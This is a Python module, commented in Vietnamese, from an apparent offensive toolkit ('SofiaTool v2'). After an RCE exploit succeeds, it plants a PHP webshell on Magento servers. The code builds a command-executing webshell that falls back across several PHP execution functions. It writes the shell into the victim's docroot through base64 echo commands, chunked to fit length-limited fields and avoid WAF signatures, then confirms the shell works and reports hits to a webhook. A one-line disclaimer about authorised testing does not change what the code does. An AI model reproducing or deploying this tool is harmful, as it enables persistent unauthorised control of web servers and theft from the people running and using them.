"""SofiaTool v2 — tools/webshell.py

Tự động tạo webshell SAU KHI exploit RCE thành công.

Được dùng chung bởi 3 module RCE:
  - exploit/cve_2022_24086.py  (template-filter RCE  -> chạy lệnh ghi file)
  - exploit/cve_2026_75650.py  (StyleSmuggler SSTI   -> PHP poison include ghi file)
  - exploit/session_reaper.py  (SessionReaper Vector B -> upload session cookie-jar)

Khi module RCE xác nhận `id`/`whoami` (HIT), nó gọi webshell ở đây để:
  1. Sinh tên shell `sofiax<5 ký tự ngẫu nhiên>` (file `sofiaxXXXXX.php`).
  2. Ghi nội dung PHP vào docroot thật của nạn nhân bằng CHÍNH primitive RCE
     đã có (shell command / file_put_contents trong payload / upload session).
  3. Probe các URL ứng viên để xác nhận shell SỐNG (marker riêng theo token,
     chống false-positive từ 200 chung chung / artifact cũ).
  4. Lưu evidence (shell.php + meta.json) và báo webhook bổ sung dòng
     `webshell sofiaxXXXXX.php -> <url> | id+whoami`.

Thiết kế: module này KHÔNG import ngược lại các module exploit (tránh vòng
import). Nó chỉ cung cấp:
  - hàm thuần sinh tên / nội dung PHP / danh sách path & URL ứng viên;
  - `deploy()` nhận vào 1 `write_fn(fs_path, php)` do module exploit truyền — ai
    gọi thì tự biết primitive của mình;
  - `verify()` probe HTTP để xác nhận shell sống.

Tham số hóa (env SOFIA_WEBSHELL_*):
  SOFIA_WEBSHELL=0            tắt hoàn toàn auto-webshell (mặc định bật)
  SOFIA_WEBSHELL_NAME         tiền tố tên shell (mặc định "sofiax")
  SOFIA_WEBSHELL_DOCROOTS     docroot ứng viên, phân tách bởi "," (ghi đè)
  SOFIA_WEBSHELL_SHELL_PATH   ghim 1 đường dẫn filesystem duy nhất
  SOFIA_WEBSHELL_PATHS        URL probe tùy biến ("{shell}" = tên file)
  SOFIA_WEBSHELL_CMD          lệnh mặc định khi truy cập shell (?c=)
  SOFIA_WEBSHELL_MAX_TRIES    số candidate tối đa thử ghi (mặc định: hết)

CHỈ DÙNG CHO MỤC ĐÍCH KIỂM THỬ BẢO MẬT ĐƯỢC UỶ QUYỀN.
"""
import base64
import json
import os
import secrets
import string

import requests

from core import config
from core.logger import get_logger
from exploit import proof

log = get_logger()

_ALNUM = string.ascii_lowercase + string.digits

# Marker nhận diện CHÍNH shell này (echo khi gọi ?t=<token>):
#   SOFIA_WS:<tên shell>  -> chống trùng artifact cũ / 200 chung chung.
MARK = "SOFIA_WS"
DEFAULT_CMD = "id; whoami"

# Docroot ứng viên cho Magento 2 (giống các module RCE khác).
_DEFAULT_DOCROOTS = (
    "/var/www/html", "/var/www/html/pub", "/var/www/magento", "/var/www",
    "/app", "/srv/magento", "/home/magento/public_html",
    "/opt/bitnami/magento",
)


def _env_on(name, default="1"):
    return (os.environ.get(name, default) or "").strip().lower() in (
        "1", "true", "yes", "on")


def enabled():
    """Auto-webshell có bật không (SOFIA_WEBSHELL, mặc định bật)."""
    return _env_on("SOFIA_WEBSHELL", "1")


def chunk_size():
    """Độ dài 1 chunk base64 khi phải ghi qua tham số giới hạn độ dài."""
    try:
        v = int(os.environ.get("SOFIA_WEBSHELL_CHUNK", "").strip())
        if v > 0:
            return v
    except (TypeError, ValueError):
        pass
    return 120


def rand_token(n=12):
    return "".join(secrets.choice(_ALNUM) for _ in range(n))


# ------------------------------------------------------------------ tên shell ---
def new_name(prefix=None):
    """Tên shell: `<prefix><5 ký tự ngẫu nhiên>` (mặc định prefix "sofiax").

    Ví dụ: sofiaxk3m9q — file trên đĩa là `sofiaxk3m9q.php`.
    """
    p = (prefix if prefix is not None
         else os.environ.get("SOFIA_WEBSHELL_NAME", "sofiax")) or "sofiax"
    p = str(p).strip() or "sofiax"
    return p + "".join(secrets.choice(_ALNUM) for _ in range(5))


def filename(name):
    """Tên shell -> tên file PHP (thêm ".php" nếu chưa có)."""
    return name if name.endswith(".php") else name + ".php"


# --------------------------------------------------------------- nội dung PHP ---
def php_source(name, token, cmd=DEFAULT_CMD):
    """Nội dung PHP webshell đa-callback.

    - `?t=<token>`  -> echo `SOFIA_WS:<name>` (xác nhận ĐÚNG shell này, sống,
      không phụ thuộc disable_functions).
    - `?c=<cmd>`    -> chạy lệnh qua callback đầu tiên còn bật
      (system -> passthru -> shell_exec -> exec -> assert); 403 "webshell dead"
      nếu mọi callback bị disable_functions chặn.

    Chuỗi concat thuần (không placeholder format) để nhúng an toàn vào payload
    RCE của từng CVE.
    """
    return (
        "<?php "
        "$c=isset($_GET['c'])?$_GET['c']:'" + cmd + "';"
        "if(isset($_GET['t'])&&$_GET['t']==='" + token + "'){"
        "echo '" + MARK + ":" + name + "';exit;}"
        "$df=(string)@ini_get('disable_functions').',';$out='';"
        "if(stripos($df,'system')===false){echo @system($c);$out='ok';}"
        "elseif(stripos($df,'passthru')===false){@passthru($c);$out='ok';}"
        "elseif(stripos($df,'shell_exec')===false){echo @shell_exec($c);$out='ok';}"
        "elseif(stripos($df,'exec')===false){@exec($c,$o);echo implode(\"\\n\","
        "(array)$o);$out='ok';}"
        "elseif(PHP_VERSION_ID<70200&&stripos($df,'assert')===false)"
        "{@assert($c);$out='ok';}"
        "if($out!=='ok'){http_response_code(403);echo 'webshell dead';}?>"
    )


def write_commands(fs_path, php):
    """Lệnh shell ghi `php` vào `fs_path` (portable: echo/printf | base64 -d).

    Không dùng dấu nháy để nhúng được vào template directive của 24086 và hạn
    chế ký tự bị WAF signature. base64 chỉ chứa [A-Za-z0-9+/=]. Đường dẫn
    candidate không có khoảng trắng nên an toàn khi không quote.
    """
    b64 = base64.b64encode(php.encode("utf-8", "replace")).decode("ascii")
    return [
        "echo %s|base64 -d>%s" % (b64, fs_path),
        "printf %%s %s|base64 -d>%s" % (b64, fs_path),
        "echo %s|base64 -d|tee %s>/dev/null" % (b64, fs_path),
    ]


def write_commands_chunked(fs_path, php, limit=120):
    """Chia nội dung PHP thành NHIỀU lệnh ghi nối tiếp (`>` rồi `>>`).

    Dùng cho kênh có giới hạn độ dài tham số (address field của CVE-2022-24086
    ~255 ký tự): mỗi lệnh chỉ mang 1 chunk base64 vừa đủ nhúng vào directive,
    các lệnh sau append bằng `>>`. Trả list lệnh theo đúng thứ tự.
    """
    b64 = base64.b64encode(php.encode("utf-8", "replace")).decode("ascii")
    out, redir = [], ">"
    for i in range(0, len(b64), limit):
        out.append("echo %s|base64 -d%s%s" % (b64[i:i + limit], redir, fs_path))
        redir = ">>"
    return out


def php_writer_code(name, token, docroots=None):
    """Đoạn PHP (để nhúng vào payload RCE kiểu `include`) ghi webshell vào đĩa.

    Dùng cho cve_2026_75650: payload poison đã là PHP thật -> chỉ cần thêm
    vòng lặp `file_put_contents(base64_decode(...))` cho các docroot ứng viên.
    """
    php = php_source(name, token)
    b64 = base64.b64encode(php.encode("utf-8", "replace")).decode("ascii")
    paths = ",".join("'%s'" % fs for fs, _ in targets(name, docroots=docroots))
    return ("foreach(array(" + paths + ") as $p){"
            "@file_put_contents($p,base64_decode('" + b64 + "'));}")


# ------------------------------------------------------------ path & URL ------
def _docroots(docroots=None):
    raw = docroots
    if raw is None:
        raw = os.environ.get("SOFIA_WEBSHELL_DOCROOTS", "")
    if isinstance(raw, (list, tuple)):
        roots = [str(p).strip() for p in raw if str(p).strip()]
        return roots or list(_DEFAULT_DOCROOTS)
    roots = [p.strip() for p in str(raw or "").split(",") if p.strip()]
    return roots or list(_DEFAULT_DOCROOTS)


def targets(name, docroots=None):
    """Danh sách (fs_path, url_path) ứng viên để ghi & probe webshell.

    - SOFIA_WEBSHELL_SHELL_PATH: ghim đúng 1 fs_path (URL suy ra tương đối).
    - Mặc định: mỗi docroot -> `<root>/pub/<f>`, `<root>/<f>`,
      `<root>/pub/media/<f>`, `<root>/media/<f>`; thêm 2 dạng tương đối.
    Dedupe giữ thứ tự; cắt theo SOFIA_WEBSHELL_MAX_TRIES (nếu set).
    """
    f = filename(name)
    out = []
    override = os.environ.get("SOFIA_WEBSHELL_SHELL_PATH", "").strip()
    if override:
        out.append((override, _url_from_path(override, f)))
    else:
        for root in _docroots(docroots):
            root = root.rstrip("/")
            out.append((root + "/pub/" + f, "/pub/" + f))
            out.append((root + "/" + f, "/" + f))
            out.append((root + "/pub/media/" + f, "/pub/media/" + f))
            out.append((root + "/media/" + f, "/media/" + f))
        out.append(("pub/" + f, "/pub/" + f))
        out.append((f, "/" + f))
    seen, uniq = set(), []
    for fs, url in out:
        if fs in seen:
            continue
        seen.add(fs)
        uniq.append((fs, url))
    try:
        cap = int(os.environ.get("SOFIA_WEBSHELL_MAX_TRIES", "").strip())
        if cap > 0:
            uniq = uniq[:cap]
    except (TypeError, ValueError):
        pass
    return uniq


def _url_from_path(fs_path, f):
    """Suy URL tương đối từ 1 fs_path ghim (bỏ phần docroot đã biết)."""
    p = str(fs_path).replace("\\", "/")
    for root in _docroots():
        r = root.rstrip("/")
        if r and p.startswith(r + "/"):
            return "/" + p[len(r) + 1:]
    for marker in ("/pub/", "/media/"):
        i = p.find(marker)
        if i >= 0:
            return p[i:]
    return "/" + p.lstrip("/")


def url_paths(name, urls=None):
    """Danh sách URL path probe (mặc định suy từ `targets`)."""
    if urls:
        return list(urls)
    raw = os.environ.get("SOFIA_WEBSHELL_PATHS", "")
    tmpls = [p.strip() for p in raw.split(",") if p.strip()]
    if tmpls:
        return [t.format(shell=filename(name)) for t in tmpls]
    return [u for _, u in targets(name)]


# ------------------------------------------------------------------- verify ---
def verify(session, base, name, token, cmd=None, urls=None, timeout=None):
    """Probe các URL; xác nhận shell SỐNG và chạy được lệnh.

    Trả dict {"url","token_ok","alive","output","identity"} cho URL đầu tiên
    trả marker `SOFIA_WS:<name>` (đúng shell này); None nếu không thấy.
    `alive=False` khi file tồn tại nhưng disable_functions chặn 'webshell dead'.
    """
    timeout = timeout or config.TIMEOUT
    for up in url_paths(name, urls=urls):
        url = base.rstrip("/") + (up if str(up).startswith("/") else "/" + str(up))
        try:
            r = session.get(url, params={"t": token}, timeout=timeout)
        except requests.RequestException:
            continue
        if r.status_code != 200:
            continue
        body = r.text or ""
        if MARK not in body or name not in body:
            continue
        res = {"url": url, "token_ok": True, "alive": False,
               "output": None, "identity": None}
        try:
            r2 = session.get(url, params={"c": cmd or DEFAULT_CMD},
                             timeout=timeout)
        except requests.RequestException:
            r2 = None
        if (r2 is not None and r2.status_code == 200
                and "webshell dead" not in (r2.text or "")):
            out = r2.text or ""
            res["alive"] = True
            res["output"] = out
            res["identity"] = proof.parse_identity(out)
        return res
    return None


# --------------------------------------------------------------- evidence -----
def save_evidence(base, name, token, php, extra=None):
    """Lưu shell.php + meta.json cho 1 webshell đã triển khai."""
    ev_dir = os.path.join(config.EVIDENCE_DIR, "webshell_" + name)
    meta = {"url_base": base, "shell": name, "file": filename(name),
            "token": token}
    if extra:
        meta.update(extra)
    try:
        os.makedirs(ev_dir, exist_ok=True)
        with open(os.path.join(ev_dir, filename(name)), "w",
                  encoding="utf-8") as f:
            f.write(php)
        with open(os.path.join(ev_dir, "meta.json"), "w",
                  encoding="utf-8") as f:
            json.dump(meta, f, indent=2, ensure_ascii=False)
    except OSError as e:
        log.warning("[%s] không ghi được evidence webshell: %s", base, e)
    return ev_dir


def identity_output(identity=None, fallback=None):
    """Một dòng output `id; whoami` làm bằng chứng webhook.

    Ưu tiên `fallback` = output THÔ mà shell trả về cho `?c=id; whoami` (nén
    về 1 dòng, chứa CẢ `id` lẫn `whoami` như đã chạy); nếu không có thì dựng
    từ `identity` (uid/gid/groups [+ whoami]). Trả "" nếu không có gì.
    """
    raw = " ".join(str(fallback or "").split())
    if raw:
        return raw
    if identity:
        return proof.identity_line(identity)
    return ""


def evidence_line(name, url, identity=None, extra="", fallback=None):
    """Bằng chứng webhook ĐỒNG BỘ cho mọi module RCE.

    Trả `<output id; whoami> | <url webshell>` để ghép với `proof.record_hit`
    thành dòng webhook đúng định dạng yêu cầu:
        CVE | domain | <output id; whoami> | <url webshell>
    `extra` (tùy chọn) chèn giữa output và url; URL LUÔN nằm CUỐI cùng.
    """
    parts = [identity_output(identity, fallback) or
             "(không thu được output id/whoami)"]
    if extra:
        parts.append(str(extra))
    parts.append(str(url))
    return " | ".join(parts)


def record(base, cve, name, url, identity, evidence_dir, extra="", fallback=None,
           key_masked=None, send=True):
    """Ghi hits.csv + webhook HIT webshell theo định dạng ĐỒNG BỘ.

    Dòng webhook: `CVE | domain | <output id; whoami> | <url webshell>`.
    `send=False` -> chỉ ghi hits.csv (dùng khi cần hoãn webhook để gộp về
    đúng MỘT dòng sau khi webshell được xác nhận).
    """
    ev = evidence_line(name, url, identity, extra, fallback=fallback)
    proof.record_hit(base, cve, ev, evidence_path=evidence_dir,
                     key_masked=key_masked or name, send=send)
    return ev


# ------------------------------------------------------------------- deploy ----
def cmd_writer(run_cmd, all_variants=False):
    """Bọc `run_cmd(cmdstr)` của module exploit thành write_fn cho `deploy`.

    `run_cmd` chạy 1 lệnh shell qua primitive RCE (directive template-filter,
    include PHP...) và trả gì cũng được; lỗi bị nuốt để không làm chết chain.
    Mặc định chỉ gửi biến thể ĐẦU (`echo | base64 -d`) để tiết kiệm request;
    `all_variants=True` gửi lần lượt cả 3 biến thể (khi biến thể đầu fail).
    """
    def write(fs_path, php):
        cmds = write_commands(fs_path, php)
        for c in (cmds if all_variants else cmds[:1]):
            try:
                run_cmd(c)
            except Exception:  # 1 biến thể lỗi không chặn biến thể sau
                log.debug("webshell write_cmd lỗi cho %s", fs_path, exc_info=True)
    return write


def _max_candidates():
    try:
        v = int(os.environ.get("SOFIA_WEBSHELL_MAX_TRIES", "").strip())
        if v > 0:
            return v
    except (TypeError, ValueError):
        pass
    return 10          # mặc định: giới hạn request để không đốt budget RCE


def deploy(write_fn, session, base, cve, name=None, token=None, cmd=None,
           candidates=None, result=None, timeout=None, extra_meta=None):
    """Vòng lặp candidate: ghi shell rồi probe -> dừng ở candidate sống đầu tiên.

    write_fn(fs_path, php): primitive ghi file của module exploit.
    Trả dict kết quả (từ `verify`) khi thành công; None nếu thất bại/tắt.
    Cập nhật `result` (nếu truyền) với các key webshell_*.
    """
    if not enabled():
        return None
    name = name or new_name()
    token = token or rand_token()
    php = php_source(name, token)
    cands = candidates if candidates is not None else targets(name)
    if candidates is None:
        cands = cands[:_max_candidates()]
    if not cands:
        return None
    for fs_path, url_path in cands:
        try:
            write_fn(fs_path, php)
        except Exception:
            log.debug("webshell write %s lỗi", fs_path, exc_info=True)
        res = verify(session, base, name, token, cmd=cmd, urls=[url_path],
                     timeout=timeout)
        if not res:
            continue
        meta = {"fs_path": fs_path, "shell_url": res["url"], "cve": cve}
        if extra_meta:
            meta.update(extra_meta)
        ev_dir = save_evidence(base, name, token, php, meta)
        record(base, cve, name, res["url"], res.get("identity"),
               ev_dir, fallback=res.get("output"))
        apply_result(result, name, res, ev_dir)
        log.info("*** WEBSHELL [%s] %s -> %s (%s) %s", cve, base, res["url"],
                 filename(name), "(alive)" if res.get("alive") else
                 "(ghi được, callback bị chặn)")
        return res
    log.info("[%s] webshell: không tạo/không probe được shell nào [%s]",
             base, cve)
    return None


def deploy_via_cmd(run_cmd, session, base, cve, **kw):
    """Tiện ích: deploy() cho primitive chạy được shell command (24086/75650)."""
    return deploy(cmd_writer(run_cmd), session, base, cve, **kw)


def apply_result(result, name, res, evidence_dir):
    """Cập nhật dict `result` của module exploit với thông tin webshell."""
    if result is None:
        return
    result["webshell_name"] = filename(name)
    result["webshell_url"] = res.get("url")
    result["webshell_alive"] = bool(res.get("alive"))
    result["webshell_identity"] = res.get("identity")
    result["webshell_evidence_dir"] = evidence_dir
